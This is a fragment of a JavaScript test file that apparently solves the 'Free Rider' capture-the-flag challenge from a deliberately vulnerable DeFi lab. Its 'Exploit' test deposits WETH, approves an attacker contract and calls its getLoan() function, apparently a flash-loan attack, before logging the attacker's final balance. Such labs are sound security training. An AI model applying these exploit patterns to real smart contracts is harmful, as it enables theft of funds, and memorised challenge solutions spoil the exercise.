...
describe("[Challenge] Free Rider", function () {
    ...
    before(async function () {
        ...
        expect(await this.uniswapPair.balanceOf(deployer.address)).to.be.gt(
            "0"
        );
    ...
    it("Exploit", async function () {
        ...
        // Set fee
        let tx = await this.weth.connect(attacker).deposit({ value: fee });
        const attWethBal = await this.weth.balanceOf(attacker.address);
        await this.weth
            .connect(attacker)
            .approve(attackerContract.address, fee);
        console.log(`WETH: ${attWethBal}`);
        console.log(`deposited and approved fee!`);
        await attackerContract.getLoan();
        const finalBal = await ethers.provider.getBalance(attacker.address);
        console.log(`Final Balance: ${ethers.utils.formatEther(finalBal)}`);
    });
